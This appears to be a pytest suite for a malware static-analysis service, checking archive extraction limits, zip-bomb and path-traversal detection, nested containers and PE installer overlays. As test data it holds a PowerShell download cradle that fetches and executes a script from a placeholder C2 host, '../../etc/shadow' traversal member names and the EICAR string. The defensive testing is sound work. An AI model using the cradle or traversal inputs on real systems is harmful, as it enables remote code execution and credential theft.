r"""Unit and integration tests for Stage 2 Item 3 Static Analysis:
Format Deep-Dive / Archive Inspection, Resource Limits, and Nested Payload Analysis.

Validates:
- Safe archive extraction across ZIP, TAR, TAR.GZ, and 7z
- Decompression bomb ratio guard (> 100:1) with immediate abort
- Path traversal attack neutralization (../../ and C:\ roots) with anomaly findings
- Encrypted / password-protected archive member detection without exceptions
- Recursive nested container traversal with depth limit (max 3)
- Member payload security inspection: format identification, hashing, and YARA scanning
- Malicious payload propagation: member threat elevates parent container verdict to 'malicious'
- PE Installer / SFX overlay unpacking: verifies clean vendor installers vs malicious droppers
"""

import io
import os
import struct
import tarfile
import zipfile
import pytest

from app.services.static.formats.archive import (
    MAX_DECOMPRESSION_RATIO,
    MAX_RECURSION_DEPTH,
    analyze_archive,
    is_archive_or_container,
    sanitize_member_path,
)
from app.services.static.pipeline import run_complete_static_pipeline


EICAR_STRING = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"


def test_sanitize_member_path():
    """Verify path traversal neutralization and anomaly flagging."""
    clean, has_anom = sanitize_member_path("normal/path/file.txt")
    assert clean == "normal/path/file.txt"
    assert has_anom is False

    clean, has_anom = sanitize_member_path("../../etc/passwd")
    assert clean == "etc/passwd"
    assert has_anom is True

    clean, has_anom = sanitize_member_path("C:\\Windows\\System32\\cmd.exe")
    assert clean == "Windows/System32/cmd.exe"
    assert has_anom is True

    clean, has_anom = sanitize_member_path("/absolute/unix/root.sh")
    assert clean == "absolute/unix/root.sh"
    assert has_anom is True


def test_zip_clean_container_analysis():
    """Verify clean ZIP archive extracts safely and evaluates as clean."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("docs/readme.txt", b"Standard software documentation.")
        zf.writestr("config.json", b'{"version": "1.0.0", "active": true}')
    data = buf.getvalue()

    assert is_archive_or_container(data) is True
    res = analyze_archive(data)
    assert res["container_type"] == "zip"
    assert res["file_count"] == 2
    assert res["extracted_count"] == 2
    assert res["is_bomb"] is False
    assert res["is_encrypted"] is False
    assert len(res["indicators"]) == 0

    pipe_res = run_complete_static_pipeline(data)
    assert pipe_res["format"] == "container"
    assert pipe_res["verdict"] == "no_indicators_found_limited"
    assert pipe_res["static_risk_score"] == 0


def test_zip_with_malicious_eicar_payload_propagates():
    """Verify malicious payload inside ZIP elevates parent archive verdict to malicious."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("innocent.txt", b"Safe file")
        zf.writestr("payloads/eicar_test.com", EICAR_STRING)
    data = buf.getvalue()

    res = analyze_archive(data)
    assert res["extracted_count"] == 2
    assert len(res["indicators"]) == 1
    assert res["indicators"][0]["classification"] == "malicious"
    assert "payloads/eicar_test.com" in res["indicators"][0]["location"]

    pipe_res = run_complete_static_pipeline(data)
    assert pipe_res["format"] == "container"
    assert pipe_res["verdict"] == "malicious"
    assert pipe_res["static_risk_score"] >= 60
    assert any("eicar_test.com" in f["factor"] for f in pipe_res["assessment_factors"])


def test_zip_with_script_threat_propagates():
    """Verify script threats (PowerShell download cradle) inside ZIP are detected and propagated."""
    ps_cradle = (
        b"$wc = New-Object System.Net.WebClient;\n"
        b"$cmd = $wc.DownloadString('http://c2.example.com/payload.ps1');\n"
        b"IEX($cmd);\n"
    )
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("installer.ps1", ps_cradle)
    data = buf.getvalue()

    pipe_res = run_complete_static_pipeline(data)
    assert pipe_res["format"] == "container"
    assert pipe_res["verdict"] == "malicious"
    assert any("installer.ps1" in f["factor"] for f in pipe_res["assessment_factors"])


def test_tar_gz_clean_and_script_format_detection():
    """Verify TAR.GZ archive extraction and format classification."""
    tbuf = io.BytesIO()
    with tarfile.open(fileobj=tbuf, mode="w:gz") as tf:
        script_bytes = b"#!/bin/bash\necho 'Running clean setup'\nexit 0\n"
        ti = tarfile.TarInfo(name="bin/setup.sh")
        ti.size = len(script_bytes)
        tf.addfile(ti, io.BytesIO(script_bytes))
    data = tbuf.getvalue()

    assert is_archive_or_container(data) is True
    res = analyze_archive(data)
    assert res["container_type"] == "tar"
    assert res["extracted_count"] == 1
    assert res["members"][0]["format"] == "script"

    pipe_res = run_complete_static_pipeline(data)
    assert pipe_res["format"] == "container"
    assert pipe_res["verdict"] == "no_indicators_found_limited"


def test_nested_archive_recursion_depth_limit():
    """Verify recursive inspection down to depth 3 and proper capping beyond."""
    # Level 3 (innermost)
    l3 = io.BytesIO()
    with zipfile.ZipFile(l3, "w") as zf:
        zf.writestr("innermost.txt", EICAR_STRING)

    # Level 2
    l2 = io.BytesIO()
    with zipfile.ZipFile(l2, "w") as zf:
        zf.writestr("level3.zip", l3.getvalue())

    # Level 1 (outermost)
    l1 = io.BytesIO()
    with zipfile.ZipFile(l1, "w") as zf:
        zf.writestr("level2.zip", l2.getvalue())

    res = analyze_archive(l1.getvalue())
    assert res["extracted_count"] >= 1
    # Innermost EICAR must propagate through nested layers
    assert any(m["verdict"] == "malicious" for m in res["members"])
    assert len(res["indicators"]) >= 1

    pipe_res = run_complete_static_pipeline(l1.getvalue())
    assert pipe_res["verdict"] == "malicious"


def test_zip_bomb_safety_threshold_ratio_guard():
    """Verify decompression bomb ratio guard aborts extraction safely."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("bomb.dat", b"\x00" * (10 * 1024 * 1024))
    data = buf.getvalue()

    res = analyze_archive(data)
    assert res["is_bomb"] is True
    assert res["extracted_count"] == 0
    assert any("bomb" in f["id"].lower() for f in res["findings"])

    pipe_res = run_complete_static_pipeline(data)
    assert pipe_res["format"] == "container"
    assert any("bomb" in f["factor"].lower() for f in pipe_res["assessment_factors"])


def test_path_traversal_neutralization_and_anomaly():
    """Verify path traversal in ZIP members is neutralized and flagged."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("../../etc/shadow", b"root:$6$xyz:19000:0:99999:7:::")
    data = buf.getvalue()

    res = analyze_archive(data)
    assert res["members"][0]["name"] == "etc/shadow"
    assert any("traversal" in f["id"].lower() for f in res["findings"])


def test_encrypted_zip_password_protected_detection():
    """Verify password-protected archive members are detected without crashing."""
    # Synthetic ZIP entry with bit 0 (encrypted) set in general purpose flag
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("secret.txt", b"Confidential data payload")
    raw = bytearray(buf.getvalue())
    # Flip bit 0 in local header general purpose bit flag (offset 6)
    raw[6] |= 0x01
    # Also flip bit 0 in central directory header
    cd_idx = raw.find(b"PK\x01\x02")
    if cd_idx != -1:
        raw[cd_idx + 8] |= 0x01

    res = analyze_archive(bytes(raw))
    assert res["is_encrypted"] is True
    assert any("encrypted" in c.lower() or "password" in c.lower() for c in res["could_not_analyze"])


def test_synthetic_pe_installer_overlay_verified_clean():
    """Verify PE installer stub with valid clean archive overlay evaluates to clean with verified finding."""
    # Construct minimal PE stub
    mz = bytearray(b"MZ" + b"\x00" * 58 + struct.pack("<I", 0x80) + b"\x00" * 64)
    pe_sig = b"PE\x00\x00"
    coff = struct.pack("<HHIIIHH", 0x8664, 1, 0x67100000, 0, 0, 240, 0x0022)
    std = struct.pack("<HBBIIIII", 0x020B, 14, 0, 0x200, 0, 0, 0x1000, 0x1000)
    win = struct.pack("<QIIHHHHHHIIIIHHQQQQII",
        0x140000000, 0x1000, 0x200, 6, 0, 0, 0, 6, 0, 0,
        0x2000, 0x200, 0, 3, 0x8160, 0x100000, 0x1000, 0x100000, 0x1000, 0, 16
    )
    dirs = bytearray(128)
    sec1 = struct.pack("<8sIIIIIIHHI", b".text\x00\x00\x00", 0x1000, 0x1000, 0x200, 0x200, 0, 0, 0, 0, 0x60000020)
    hdrs = bytearray(mz + pe_sig + coff + std + win + dirs + sec1)
    hdrs.extend(b"\x00" * (0x200 - len(hdrs)))
    sec_data = bytearray(b"\xc3" + b"\x00" * 511)

    # Valid ZIP overlay containing clean files
    zbuf = io.BytesIO()
    with zipfile.ZipFile(zbuf, "w") as zf:
        zf.writestr("app/main.py", b"print('Application entrypoint')\n")
        zf.writestr("app/config.json", b'{"installed": true}')
    clean_overlay = zbuf.getvalue()

    installer_pe = bytes(hdrs + sec_data + clean_overlay)
    res = run_complete_static_pipeline(installer_pe)

    # Must evaluate clean because payload was unpacked and verified
    assert res["verdict"] == "no_indicators_found_limited"
    assert res["static_risk_score"] == 0
    assert any("payload verified" in f["factor"] for f in res["assessment_factors"])


def test_synthetic_pe_installer_overlay_with_malware_dropper():
    """Verify PE installer stub carrying embedded malware in overlay is flagged malicious."""
    mz = bytearray(b"MZ" + b"\x00" * 58 + struct.pack("<I", 0x80) + b"\x00" * 64)
    pe_sig = b"PE\x00\x00"
    coff = struct.pack("<HHIIIHH", 0x8664, 1, 0x67100000, 0, 0, 240, 0x0022)
    std = struct.pack("<HBBIIIII", 0x020B, 14, 0, 0x200, 0, 0, 0x1000, 0x1000)
    win = struct.pack("<QIIHHHHHHIIIIHHQQQQII",
        0x140000000, 0x1000, 0x200, 6, 0, 0, 0, 6, 0, 0,
        0x2000, 0x200, 0, 3, 0x8160, 0x100000, 0x1000, 0x100000, 0x1000, 0, 16
    )
    dirs = bytearray(128)
    sec1 = struct.pack("<8sIIIIIIHHI", b".text\x00\x00\x00", 0x1000, 0x1000, 0x200, 0x200, 0, 0, 0, 0, 0x60000020)
    hdrs = bytearray(mz + pe_sig + coff + std + win + dirs + sec1)
    hdrs.extend(b"\x00" * (0x200 - len(hdrs)))
    sec_data = bytearray(b"\xc3" + b"\x00" * 511)

    # ZIP overlay carrying EICAR malware dropper payload
    zbuf = io.BytesIO()
    with zipfile.ZipFile(zbuf, "w") as zf:
        zf.writestr("dropper_payload.exe", EICAR_STRING)
    malicious_overlay = zbuf.getvalue()

    installer_pe = bytes(hdrs + sec_data + malicious_overlay)
    res = run_complete_static_pipeline(installer_pe)

    # Must evaluate malicious because dropped payload is malicious
    assert res["verdict"] == "malicious"
    assert any("dropper_payload.exe" in f["factor"] for f in res["assessment_factors"])
